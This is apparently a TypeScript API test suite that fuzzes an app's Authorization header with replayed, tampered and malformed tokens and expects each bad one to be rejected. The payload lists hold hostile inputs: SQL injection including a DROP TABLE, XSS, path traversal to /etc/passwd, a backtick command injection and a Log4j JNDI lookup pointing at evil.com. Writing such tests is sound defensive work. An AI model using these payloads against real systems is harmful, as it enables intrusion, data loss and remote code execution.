import { test } from '../../utils/fixtures'
import { expect } from '../../utils/custom-expect'
import { createToken } from '../../helpers/createToken'
import { config } from '../../api-test.config'
import crypto from 'crypto'

test.describe('API Token Replay Vulnerability - Fuzz Testing', () => {
    let validToken: string
    let tokenTimestamp: number

    test.beforeAll('Setup valid token', async () => {
        validToken = await createToken(config.userEmail, config.userPassword)
        tokenTimestamp = Date.now()
    })

    test('Replay attack: Using same token multiple times rapidly', async ({ api }) => {
        const responses = []
        const requestCount = 10
        
        for (let i = 0; i < requestCount; i++) {
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: validToken })
                .getRequest(200)
            responses.push(response)
        }
        
        // All requests should succeed, but verify no session confusion
        expect(responses.length).shouldEqual(requestCount)
        const userEmails = responses.map(r => r.user.email)
        expect(new Set(userEmails).size).shouldEqual(1)
    })

    test('Fuzz: Modified token - changed signature', async ({ api }) => {
        const parts = validToken.replace('Token ', '').split('.')
        
        if (parts.length === 3) {
            // JWT-style token - corrupt signature
            const corruptedSignature = Buffer.from(crypto.randomBytes(32)).toString('base64url')
            const fuzzedToken = `Token ${parts[0]}.${parts[1]}.${corruptedSignature}`
            
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: fuzzedToken })
                .getRequest(401)
            
            expect(response.status).shouldEqual('error')
            expect(response.message).toBeDefined()
        } else {
            // Non-JWT token - modify some characters
            const tokenValue = validToken.replace('Token ', '')
            const fuzzedValue = tokenValue.substring(0, 10) + 'X' + tokenValue.substring(11)
            
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: `Token ${fuzzedValue}` })
                .getRequest(401)
            
            expect(response.status).shouldEqual('error')
            expect(response.message).toBeDefined()
        }
    })

    test('Fuzz: Modified token - changed payload', async ({ api }) => {
        const parts = validToken.replace('Token ', '').split('.')
        
        if (parts.length === 3) {
            // Attempt to modify payload (user ID, permissions, etc.)
            const originalPayload = JSON.parse(Buffer.from(parts[1], 'base64url').toString())
            const modifiedPayload = { ...originalPayload, userId: 999999, admin: true }
            const encodedPayload = Buffer.from(JSON.stringify(modifiedPayload)).toString('base64url')
            const fuzzedToken = `Token ${parts[0]}.${encodedPayload}.${parts[2]}`
            
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: fuzzedToken })
                .getRequest(401)
            
            expect(response.status).shouldEqual('error')
            expect(response.message).toBeDefined()
        } else {
            test.skip()
        }
    })

    test('Fuzz: Token with SQL injection patterns', async ({ api }) => {
        const sqlInjectionPatterns = [
            "Token ' OR '1'='1",
            "Token '; DROP TABLE users--",
            "Token ' UNION SELECT * FROM users--",
            "Token admin'--",
            "Token 1' AND '1'='1"
        ]
        
        for (const pattern of sqlInjectionPatterns) {
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: pattern })
                .getRequest(401)
            
            expect(response.status).shouldEqual('error')
        }
    })

    test('Fuzz: Token with XSS patterns', async ({ api }) => {
        const xssPatterns = [
            "Token <script>alert('XSS')</script>",
            "Token javascript:alert('XSS')",
            "Token <img src=x onerror=alert('XSS')>",
            "Token <svg/onload=alert('XSS')>"
        ]
        
        for (const pattern of xssPatterns) {
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: pattern })
                .getRequest(401)
            
            expect(response.status).shouldEqual('error')
        }
    })

    test('Fuzz: Token with special characters and encoding', async ({ api }) => {
        const specialCharPatterns = [
            "Token %00%00%00",     // URL encoded nulls
            "Token ../../../etc/passwd",  // Path traversal
            "Token ..\\\\..\\\\..\\\\windows\\\\system32",  // Windows path traversal
            "Token ${jndi:ldap://evil.com}",  // Log4j injection
            "Token {{7*7}}",  // Template injection
            "Token `whoami`"  // Command injection
        ]
        
        for (const pattern of specialCharPatterns) {
            try {
                const response = await api
                    .path('/user')
                    .clearAuth()
                    .headers({ Authorization: pattern })
                    .getRequest(401)
                
                expect(response.status).shouldEqual('error')
            } catch (error: any) {
                // Some patterns may cause HTTP header validation errors, which is expected
                expect(error.message).toContain('Invalid character')
            }
        }
    })

    test('Fuzz: Extremely long token', async ({ api }) => {
        const longToken = 'Token ' + 'A'.repeat(10000)
        
        const response = await api
            .path('/user')
            .clearAuth()
            .headers({ Authorization: longToken })
            .getRequest(401)
        
        expect(response.status).shouldEqual('error')
    })

    test('Fuzz: Empty and whitespace tokens', async ({ api }) => {
        const emptyPatterns = [
            '',
            'Token ',
            'Token  ',
            '   Token   '
        ]
        
        for (const pattern of emptyPatterns) {
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: pattern })
                .getRequest(401)
            
            expect(response.status).shouldEqual('error')
        }
    })

    test('Fuzz: Case variations', async ({ api }) => {
        const caseVariations = [
            validToken.toUpperCase(),
            validToken.toLowerCase(),
            'TOKEN ' + validToken.replace('Token ', ''),
            'token ' + validToken.replace('Token ', ''),
            'ToKeN ' + validToken.replace('Token ', '')
        ]
        
        for (const variation of caseVariations) {
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: variation })
                .getRequest(401)
            
            expect(response.status).shouldEqual('error')
        }
    })

    test('Fuzz: Random byte sequences', async ({ api }) => {
        for (let i = 0; i < 5; i++) {
            const randomBytes = crypto.randomBytes(32)
            const patterns = [
                'Token ' + randomBytes.toString('hex'),
                'Token ' + randomBytes.toString('base64'),
                'Token ' + randomBytes.toString('base64url')
            ]
            
            for (const pattern of patterns) {
                const response = await api
                    .path('/user')
                    .clearAuth()
                    .headers({ Authorization: pattern })
                    .getRequest(401)
                
                expect(response.status).shouldEqual('error')
            }
        }
    })

    test('Replay attack: Token reuse after time delay', async ({ api }) => {
        // Use token immediately
        const immediateResponse = await api
            .path('/user')
            .clearAuth()
            .headers({ Authorization: validToken })
            .getRequest(200)
        
        expect(immediateResponse.user.email).shouldEqual(config.userEmail)
        
        // Wait 2 seconds and reuse
        await new Promise(resolve => setTimeout(resolve, 2000))
        
        const delayedResponse = await api
            .path('/user')
            .clearAuth()
            .headers({ Authorization: validToken })
            .getRequest(200)
        
        expect(delayedResponse.user.email).shouldEqual(config.userEmail)
    })

    test('Fuzz: Multiple tokens in header', async ({ api }) => {
        const multiTokenPatterns = [
            `${validToken}, ${validToken}`,
            `${validToken}; ${validToken}`,
            `Bearer abc123, ${validToken}`,
            `${validToken}, Bearer xyz789`
        ]
        
        for (const pattern of multiTokenPatterns) {
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: pattern })
                .getRequest(401)
            
            expect(response.status).shouldEqual('error')
        }
        
        // Test space-separated tokens - API may accept first valid token
        const spacePattern = `${validToken} ${validToken}`
        const spaceResponse = await api
            .path('/user')
            .clearAuth()
            .headers({ Authorization: spacePattern })
            .getRequest(200)
        
        // If it accepts the request, verify it's using consistent authentication
        expect(spaceResponse.user.email).shouldEqual(config.userEmail)
    })

    test('Fuzz: Token with Unicode and international characters', async ({ api }) => {
        const unicodePatterns = [
            'Token 你好世界',
            'Token مرحبا',
            'Token Привет',
            'Token 🔒🔑💀'
        ]
        
        for (const pattern of unicodePatterns) {
            try {
                const response = await api
                    .path('/user')
                    .clearAuth()
                    .headers({ Authorization: pattern })
                    .getRequest(401)
                
                expect(response.status).shouldEqual('error')
            } catch (error: any) {
                // Unicode characters may cause HTTP header validation errors
                expect(error.message).toContain('Invalid character')
            }
        }
    })

    test('Concurrent replay attack: Same token from multiple sources', async ({ api }) => {
        const concurrentRequests = 20
        const promises = []
        
        for (let i = 0; i < concurrentRequests; i++) {
            const promise = api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: validToken })
                .getRequest(200)
            promises.push(promise)
        }
        
        const responses = await Promise.all(promises)
        
        // Verify all requests succeeded with same user
        expect(responses.length).shouldEqual(concurrentRequests)
        const userEmails = responses.map(r => r.user.email)
        expect(new Set(userEmails).size).shouldEqual(1)
        expect(userEmails[0]).shouldEqual(config.userEmail)
    })

    test('Fuzz: Token type confusion', async ({ api }) => {
        const tokenConfusionPatterns = [
            'Basic ' + Buffer.from('user:pass').toString('base64'),
            'Digest ' + validToken.replace('Token ', ''),
            'OAuth ' + validToken.replace('Token ', ''),
            'JWT ' + validToken.replace('Token ', ''),
            'ApiKey ' + validToken.replace('Token ', '')
        ]
        
        for (const pattern of tokenConfusionPatterns) {
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: pattern })
                .getRequest(401)
            
            expect(response.status).shouldEqual('error')
        }
    })

    test('Fuzz: Token with format string vulnerabilities', async ({ api }) => {
        const formatStringPatterns = [
            'Token %s%s%s%s%s',
            'Token %x%x%x%x',
            'Token %n%n%n',
            'Token %p%p%p',
            'Token %d%d%d%d'
        ]
        
        for (const pattern of formatStringPatterns) {
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: pattern })
                .getRequest(401)
            
            expect(response.status).shouldEqual('error')
        }
    })

    test('Fuzz: Truncated tokens', async ({ api }) => {
        const tokenValue = validToken.replace('Token ', '')
        const truncationLengths = [1, 5, 10, Math.floor(tokenValue.length / 2), tokenValue.length - 1]
        
        for (const length of truncationLengths) {
            const truncatedToken = 'Token ' + tokenValue.substring(0, length)
            
            const response = await api
                .path('/user')
                .clearAuth()
                .headers({ Authorization: truncatedToken })
                .getRequest(401)
            
            expect(response.status).shouldEqual('error')
        }
    })
})
